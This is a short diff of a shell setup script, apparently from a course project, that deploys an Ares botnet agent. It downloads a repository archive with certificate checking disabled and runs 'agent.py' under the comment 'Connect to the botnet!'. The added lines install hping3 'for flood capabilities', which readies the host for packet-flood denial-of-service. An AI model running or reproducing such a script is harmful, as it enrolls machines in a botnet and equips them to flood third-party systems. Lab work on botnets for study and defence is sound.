@@ -24,5 +24,8 @@ sudo pip install requests
 cd ~ && wget https://github.com/kmanwar89/460SP/archive/master.zip --no-check-certificate
 mv master master.zip && unzip master.zip
 
+# Download hping for flood capabilities
+sudo apt-get install hping3
+
 # Connect to the  botnet!
 cd 460SP-master/Ares/agent/python && python2.6 agent.py
